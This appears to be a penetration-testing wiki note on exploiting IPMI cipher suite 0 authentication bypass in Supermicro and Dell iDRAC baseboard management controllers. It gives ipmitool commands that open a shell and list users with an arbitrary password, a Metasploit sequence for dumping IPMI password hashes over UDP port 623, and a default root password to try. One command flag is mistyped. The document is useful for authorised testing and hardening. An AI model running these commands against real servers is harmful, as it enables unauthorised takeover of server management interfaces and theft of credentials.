# IPMI Cipher 0
IPMI Cipher 0 is an option that is enabled by default on many IPMI-enabled devices that allows authentication to be bypassed.\
The Supermicro BMC implementation allows remote attackers to bypass authentication and execute arbitrary IPMI commands by using cipher suite 0 (aka cipher zero) and an arbitrary password. * The Dell iDRAC6 with firmware 1.x before 1.92 and 2.x and 3.x before 3.42, and iDRAC7 with firmware before 1.23.23, allows remote attackers to bypass authentication and execute arbitrary IPMI commands by using cipher suite 0 (aka cipher zero) and an arbitrary password.\
**It has been found that the IPMI Cipher 0 has a high likely hood of being a false positive now.**

If IPMI Cipher 0 is truly set, you can exploit this from the command line with `ipmitool`

Install ipmi tool from the repository\
`ipmitool -l lanplus -C 0 -H <ipaddress> -U root -P <arbitratryPassword> shell`

Use `ipmitool` to give a list of all users with cipher 0 auth bypass\
`ipmitool -I lanplus -C 0 -H <ipaddress> -U root -P root user list`

### UDP Port 623
If UDP port 623 ipmi is open, IPMI hashes are likely to be disclosed. Metasploit has an aux scanner that can grab these hashes.
```
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <ipaddress(es)>
set OUTPUT_JOHN_FILE <desired_filename>
run
```
Hashes can be collected and possibly cracked. If hashes are cracked, you can use `ipmitool` to log into the device.

**The default root password is "calvin", so if all else fails, try logging in with that.**
